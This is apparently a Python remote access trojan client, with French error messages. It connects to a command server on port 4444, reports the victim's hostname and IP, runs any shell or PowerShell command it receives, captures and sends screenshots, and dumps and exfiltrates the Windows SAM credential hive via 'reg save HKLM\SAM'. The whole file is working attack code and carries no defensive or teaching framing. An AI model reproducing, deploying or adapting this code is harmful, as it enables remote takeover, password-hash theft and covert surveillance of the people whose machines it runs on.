import socket
import subprocess
import platform
import os

SERVER_IP = "127.0.0.1" 
SERVER_PORT = 4444

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "IP inconnue"

def execute_cmd(cmd):
    if platform.system() == "Windows":
        res = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True)
    else:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return res.stdout + res.stderr

def take_screenshot():
    try:
        import mss
        with mss.mss() as sct:
            img = sct.grab(sct.monitors[1])
            return mss.tools.to_png(img.rgb, img.size)
    except:
        return b"Erreur screenshot"

def main():
    print(f"[*] IP Client : {get_ip()}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))
    sock.send(f"{socket.gethostname()} - {get_ip()}".encode())

    while True:
        cmd = sock.recv(4096).decode("utf-8").strip()
        if not cmd or cmd == "exit":
            break
        
        if cmd == "screenshot":
            sock.sendall(take_screenshot())
        elif cmd == "sam":
           
            subprocess.run(["reg", "save", "HKLM\\SAM", "sam.hive", "/y"], capture_output=True)
            if os.path.exists("sam.hive"):
                with open("sam.hive", "rb") as f:
                    sock.sendall(f.read())
                os.remove("sam.hive")
            else:
                sock.send(b"Erreur SAM (necessite admin)")
        else:
            sock.send(execute_cmd(cmd).encode())

    sock.close()

if __name__ == "__main__":
    main()